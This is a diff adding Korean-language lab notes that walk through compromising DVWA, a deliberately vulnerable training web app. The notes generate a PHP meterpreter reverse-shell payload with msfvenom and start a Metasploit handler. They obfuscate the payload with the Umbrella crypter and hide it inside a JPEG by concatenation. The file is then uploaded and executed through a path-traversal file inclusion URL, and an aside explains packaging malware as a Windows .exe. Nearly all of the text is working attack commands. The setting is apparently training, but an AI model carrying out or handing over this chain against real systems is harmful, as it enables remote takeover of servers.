@@ -1,0 +1,38 @@
+msfvenom으로 페이로드 생성 및 핸들러 대기 이후
+msfvenom -p php/meterpreter/reverse_tcp lhost=172.16.29.200 lport=4444 -f raw > shell.php
+
+use exploit/multi/handler
+ser payload php/meterpreter/reverse_tcp
+set lhost 172.16.29.200
+set lport 4444
+exploit -j
+-----------
+
+1. 설치 / wget https://github.com/4w4k3/Umbrella/archive/refs/heads/master.zip -O Umbrella.zip
+2. 압축해제 / unzip Umbrella.zip
+3. 진입 / cd Umbrella-master
+4. 권한 / chmod +x umbrella.py
+5. 설치 파일에 실행 권한 부여 / chmod +x install.sh
+6. 설치 ㄱ / sudo ./install.sh (중간에 뭐 뜨면 싹다 y / 예)
+
+7. 설치 완료 됐을 때 에러 뜨는데 PyInstaller라는 부품을 설치하다가 난 것인데, 이건 악성코드를 윈도우용 .exe 파일로 포장할 때나 쓰는 녀석입니다. 우리가 지금 만들려는 건 PHP 독물이니, 저 에러는 가볍게 무시하고 바로 가공에 들어가도 무방. / 만약 exe파일로 포장할거면 저건 어케하죠? 질문 들어오면 
+1)# Wine 경로를 통해 윈도우용 파이썬의 pip를 강제 업데이트
+wine python -m pip install --upgrade pip
+2)wine python -m pip install pyinstaller << 이거 하라하면 됨 하지만 지금은 x
+
+8. python2 umbrella.py -i /home/zizon/바탕화면/shell.php -o /home/zizon/바탕화면/crypted.php << 경로 알아서 바꿔라 해야 하는데 그냥 독 만들 때 다같이 맞추기 ㄱ
+9. 엔터엔터 하면 우산 뜸
+10. 여기서 D 입력하면 pdf, word 등등 뜨는데 우리가 할 건 dvwa file upload, inclusion 이라 이렇게 굳이 복잡한 드롭퍼 필요 x so 사진 속에 날것의 독 그대로 숨겨버리는 스테가노그래피 기법(cat 명령어) 사용할 것
+11. ctrl+c 눌러서 메인 콘솔창으로 나가서 바탕화면으로 이동 ㄱㄱ
+12. # 바탕화면에서 실행
+wget https://upload.wikimedia.org/wikipedia/commons/b/bf/Bulldog_inglese.jpg -O bulldog.jpg / 강아지 사진 다운 ㄱ
+밑에거 실행
+# 바탕화면에서 실행
+wget https://upload.wikimedia.org/wikipedia/commons/b/bf/Bulldog_inglese.jpg -O bulldog.jpg
+13. cat bulldog.jpg shell.php > dog.jpg / 리다이렉션 뭐 다 알겠지 
+14. ls -lh dog.jpg 강아지파일 용량 확인
+15. 원본 강아지파일 용량 확인 후 비교
+16. 이제 dvwa에서 파일 올려버리기
+17. 파일 올라갔는지 우분투에서 경로확인 후 ls로 사진파일 확인
+18. 확인됐으면 파일인클루전으로 http://dv.ulla.com/vulnerabilities/fi/?page=../../hackable/uploads/dog.jpg 실행
+끗
